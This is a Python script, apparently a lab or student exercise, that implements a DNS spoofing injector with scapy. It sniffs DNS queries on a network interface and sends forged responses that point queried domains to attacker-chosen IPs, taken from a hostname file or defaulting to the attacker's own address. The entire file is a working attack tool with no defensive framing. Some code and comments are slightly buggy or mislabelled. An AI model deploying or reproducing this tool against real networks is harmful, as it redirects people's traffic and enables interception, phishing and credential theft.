import sys
import scapy.all as scapy

# Get list of network interfaces available on the system
ip = scapy.get_if_list()
print(ip)

# # Function to get the hijack IP based on the queried domain
def get_hijack_ip(query):
    """
    Returns the IP to use for hijacking based on the queried domain.
    """
    query = query.rstrip('.')  # Strip any trailing dot
    return hostnames.get(query, attacker_ip)  # Return IP from hostnames if available, else default attacker_ip
        


# Sniff DNS packets and inject forged responses
def inject(packet, attacker_ip):
    """
    Starts sniffing DNS traffic on the specified interface and injects forged responses.
    """

    attacker_ip = get_hijack_ip(packet[scapy.DNS].qd.qname.decode())


    payload = scapy.DNS(
        id=packet[scapy.DNS].id,         # Match the Transaction ID from the request
        qr=1,            # Response flag
        opcode=0,        # Standard query
        aa=0,            # Authoritative Answer
        an=1,
        tc=0,            # Not Truncated
        rd=1,            # Recursion Desired
        ra=1,            # Recursion Available
        z=0,             # Reserved
        ad=0,            # AD (Authenticated Data) flag set to 1
        rcode=0,         # No error
    )

    # Add the original query in the Question Section
    payload.qd = scapy.DNSQR(qname=packet[scapy.DNS].qd.qname, qtype="A", qclass="IN")

    payload.an = scapy.DNSRR(rrname=packet[scapy.DNS].qd.qname, rdata=attacker_ip, ttl= 160428)
    payload.ar = scapy.DNSRR(type="OPT")

    ip_packet = scapy.IP(src=packet[scapy.IP].dst, dst=packet[scapy.IP].src)
    udp_segment = scapy.UDP(sport=packet[scapy.UDP].dport, dport=packet[scapy.UDP].sport)
    final_packet = ip_packet / udp_segment / payload
    scapy.send(final_packet, verbose=False)

    
    

# Main program entry point
if __name__ == "__main__":

    hostnames = {}  # Dictionary to hold IP-hostname pairs from the hostname file

    if len(sys.argv) < 3 or len(sys.argv) > 5:
        print("Usage: dnsinjector.py [-i interface] [-h hostnames]")
        sys.exit(1)
    for i in range(1, len(sys.argv)):
        if sys.argv[i] == "-i":  # Interface argument
            interface = sys.argv[i + 1]
            print(interface)
        elif sys.argv[i] == "-h":  # Hostname file argument
            hostname_file = sys.argv[i + 1]
            try:
                with open(hostname_file, 'r') as file:
                    for line in file:
                        ip, hostname = line.strip().split(',')
                        hostnames[hostname.strip()] = ip.strip()
                print(f"Loaded {len(hostnames)} hostnames from {hostname_file}.")
            except FileNotFoundError:
                print(f"Hostname file {hostname_file} not found.")
                sys.exit(1)

    attacker_ip = scapy.get_if_addr(interface)


    print("Starting DNS injection...")
    scapy.sniff(iface=interface, filter="ip and udp port 53", prn=lambda packet: inject(packet, attacker_ip), store=0)
